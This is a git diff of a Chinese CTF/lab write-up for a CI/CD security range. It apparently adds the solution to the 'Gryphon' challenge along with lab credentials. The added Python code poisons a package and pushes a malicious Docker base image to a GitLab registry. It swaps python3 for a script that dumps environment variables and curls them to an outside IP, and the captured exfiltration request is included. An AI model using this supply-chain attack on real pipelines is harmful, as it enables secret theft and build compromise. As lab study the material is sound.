@@ -20,7 +20,12 @@ Password: alice1234
 - Gitea
 - Username: red_queen
 - Password: ciderland5#
+gitlab
+root
+ciderland5#
 ```
+
+建议可以先看看踩坑
 
 ## White Rabbit
 
@@ -217,9 +222,7 @@ stage('deploy') {
 }
 ```
 
-然后push过去就可以执行（我这边直接用main分支就可以了，我看有的wp用的自己的branch，但是我这边似乎有问题，检测不到新branch）
-
-（重启完就好了。。。）
+然后push过去就可以执行。
 
 ## Cheshire Cat
 
@@ -358,7 +361,7 @@ iptables -P FORWARD ACCEPT
 iptables -A INPUT -p tcp --dport 2222 -j ACCEPT
 iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-ports 2222
 
-#蜜罐使用完之后将转发的规则删除，要删干净
+#蜜罐使用完之后将转发的规则删除，要删干净。
 iptables -L INPUT --line-numbers
 iptables -D INPUT 7
 iptables -t nat -L -n --line-numbers
@@ -579,10 +582,258 @@ git diff --word-diff=porcelain origin/main | grep -e "^-[^-]" | wc -w | xargs
 
 ## Gryphon
 
-不是很懂这里最后到底是怎么触发nest-of-gold和awesome-app的pipeline的。。。
+遇到issue里的情况，nest-of-gold和awesome-app的pipeline并不会执行定期执行：
+
+![image-20231108130521744](README.assets/image-20231108130521744.png)
+
+登上admin，点take ownership就有权限定期执行了。但是这样还是不行，执行pipeline的时候会遇到`RROR: Preparation failed: Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running? (docker.go:869:0s)`的情况。（改完架构就好了。。。离谱）
 
 
+
+一共三个仓库，可控的是pygryphon，awesome-app的pipeline在构建的时候会调用pygryphon中我们可控的恶意代码，且flag11是nest-of-gold的环境变量。
+
+nest-of-gold的pipeline：
+
+```gitlab
+image: "python:3.9.15-alpine3.16"
+
+stages:
+  - test
+  - deploy
+
+test-job:
+  stage: test
+  script:
+    - pip3 install -r requirements.txt
+    - export FLAG11=test
+    - python3 -m venv tmp
+    - source tmp/bin/activate
+    - pytest test_login.py
+    - deactivate
+
+deploy-job:
+  stage: deploy
+  environment: production
+  script:
+    - apk add docker-cli openssh-client
+    - echo $SSH_KEY | base64 -d > key && chmod 400 key
+    - set -m
+    - ssh -fN -o StrictHostKeyChecking=no -i key -L 1111:127.0.0.1:2376 root@prod
+    - export DOCKER_HOST=tcp://127.0.0.1:1111
+    - docker build --pull -t web:latest .
+    - docker stop web || true
+    - docker rm web || true
+    - docker login -u gryphon -p $TOKEN $CI_REGISTRY
+    - docker run -d -e FLAG11=$FLAG11 -p 5000:5000 --name web web:latest
+
+
+```
+
+最后会build当前的dockerfile并构建容器，flag11是这个web容器中的环境变量。而nest-of-gold的dockerfile中拉取的镜像是gitlab仓库中的：
+
+```dockerfile
+FROM gitlab:5050/wonderland/nest-of-gold/python:3.8
+
+WORKDIR /app
+COPY app.py .
+COPY requirements.txt .
+RUN pip3 install -r requirements.txt
+
+CMD [ "python3", "-m" , "flask", "run", "--host=0.0.0.0"]
+
+```
+
+因此利用awesome-app的pipeline执行我们注入的恶意代码，即将恶意的镜像推送到gitlab，从而污染了image，实现flag的盗取。
+
+修改greet.py的内容，执行将获取flag的命令来替代镜像中的python3命令。官方wp里的不太对，官方的命令在执行`RUN pip3 install -r requirements.txt`的时候就会curl，但是这个时候flag还没有注入到环境中，而且
+
+```python
+import subprocess
+
+DOCKERFILE = """FROM python:3.8
+COPY python3 /usr/local/bin/python3.bak
+RUN mv /usr/local/bin/pip3 /usr/local/bin/pip3.bak
+COPY pip3 /usr/local/bin/pip3
+"""
+# Exfiltrate Flag11. Insert your server address
+PYTHON3 = """#!/bin/bash
+env > /tmp/flag.txt;
+curl http://10.207.127.144:39502/ -F file=@/tmp/flag.txt
+"""
+PIP3 ="""#!/bin/bash
+/usr/local/bin/pip3.bak install -r requirements.txt
+mv /usr/local/bin/python3.bak /usr/local/bin/python3
+"""
+
+
+def run(cmd):
+    proc = subprocess.run(cmd, shell=True, timeout=180)
+    print(proc.stdout)
+    print(proc.stderr)
+
+
+def hello(name):
+    """
+    We will build and push a malicous docker image as if it were python 3.8, but in fact
+    the python3 binary will be our evil script
+    """
+    run('apk add docker-cli')
+    with open('Dockerfile', 'w') as f:
+        f.write(DOCKERFILE)
+    with open('python3', 'w') as f:
+        f.write(PYTHON3)
+    with open('pip3','w') as f:
+        f.write(PIP3)
+    # Grant our script execution permission
+    run('chmod +x python3')
+    run('chmod +x pip3')
+    # Build the docker file
+    run('DOCKER_HOST=tcp://docker:2375 docker build -t gitlab:5050/wonderland/nest-of-gold/python:3.8 .')
+    # Login to the docker registry using TOKEN
+    run('DOCKER_HOST=tcp://docker:2375 docker login -u gryphon -p $TOKEN $CI_REGISTRY')
+    # Push our malicious python docker image to the registry
+    run('DOCKER_HOST=tcp://docker:2375 docker push gitlab:5050/wonderland/nest-of-gold/python:3.8')
+    return "Hello, " + name
+```
+
+
+
+之后就是build成包。要先去把已有的包删掉：
+
+![image-20231108192707859](README.assets/image-20231108192707859.png)
+
+再build并上传
+
+```bash
+python3.10 -m build ./
+python3.10 -m twine upload -r gitlab dist/* --verbose
+```
+
+`.pypirc`：
+
+```bash
+
+#distutils]
+index-servers =
+    gitlab
+
+[gitlab]
+repository = http://localhost:4000/api/v4/projects/pygryphon%2Fpygryphon/packages/pypi
+username = alice
+password = 998b5802ec365e17665d832f3384e975
+```
+
+![image-20231108183039798](README.assets/image-20231108183039798.png)
+
+
+
+之后剩下两个项目每10分钟自动执行一次pipeline，就可以盗取flag了。
+
+awesome-app的pipeline会安装一些东西需要十几分钟的时间，nest-of-gold的pipeline会直接报错：
+
+![image-20231108200755415](README.assets/image-20231108200755415.png)
+
+这似乎是代码本身的问题，gitlab登root上去把这行pipeline删掉就行。经过测试似乎执行pipeline的时候挂全局魔法执行的会变快。
+
+之所以会awesome-app会触发恶意代码，是因为pipeline中进行了pytest：
+
+```bash
+pytest -rA test_hello.py
+```
+
+而test_hello.py中访问了flask的hello函数：
+
+```python
+import pytest
+from app import app as flask_app
+
+
+@pytest.fixture()
+def app():
+    yield flask_app
+
+
+@pytest.fixture()
+def client(app):
+    return app.test_client()
+
+
+def test_hello(client):
+    response = client.get("/hello")
+    assert b"Hello, User" in response.data
+
+```
+
+因此触发了恶意方法：
+
+```python
+def hello():
+    return greet.hello('User')
+
+```
+
+
+
+`awesome-app`的`stage: test`最后是这样就说明恶意python镜像传成功了：
+
+![image-20231108205932823](README.assets/image-20231108205932823.png)
+
+nest-of-gole最后会是这样：
+
+![image-20231108214943041](README.assets/image-20231108214943041.png)
+
+```bash
+POST / HTTP/1.1
+Host: 10.207.127.144:39502
+User-Agent: curl/7.88.1
+Accept: */*
+Content-Length: 720
+Content-Type: multipart/form-data; boundary=------------------------848315760974512a
+
+--------------------------848315760974512a
+Content-Disposition: form-data; name="file"; filename="flag.txt"
+Content-Type: text/plain
+
+HOSTNAME=bdc53e195baf
+PYTHON_VERSION=3.8.18
+PWD=/app
+FLAG11=xxx
+PYTHON_SETUPTOOLS_VERSION=57.5.0
+HOME=/root
+LANG=C.UTF-8
+GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568
+SHLVL=1
+PYTHON_PIP_VERSION=23.0.1
+PYTHON_GET_PIP_SHA256=22b849a10f86f5ddf7ce148ca2a31214504ee6c83ef626840fde6e5dcd809d11
+PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/c6add47b0abf67511cdfb4734771cbab403af062/public/get-pip.py
+PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+_=/usr/bin/env
+
+--------------------------848315760974512a--
+```
+
+
+
+
+
+至此这个靶场结束。学到了很多的东西。
 
 ## 踩坑
 
 如果built-in节点经常有任务卡住了，重启jenkins-server就可以了。
+
+`virtualenv venv`进行就报错的话就admin登上jenkins把前面会报错的命令删掉就行了。
+
+这个靶场给我的感觉就是环境的体验比较差，很多地方经常很卡或者报错，刷完之后才发现因为我是m1芯片，为了兼容环境设置了`DOCKER_DEFAULT_PLATFORM=linux/amd64`的环境变量，因此构建的镜像都是amd64的，导致了问题。后来把DOCKER_DEFAULT_PLATFORM改成`linux/arm64`后再`docker-compose up -d`来创建环境，其中有些镜像会提示只有amd64，在`docker-compose.yaml`额外设置架构就可以，例如：
+
+```yaml
+  localstack:
+    image: localstack/localstack:0.14.1-amd64
+    platform: linux/amd64
+    container_name: localstack
+    restart: always
+    networks:
+      - goat
+```
+
+这样启动的靶场又流程又不会出问题了。
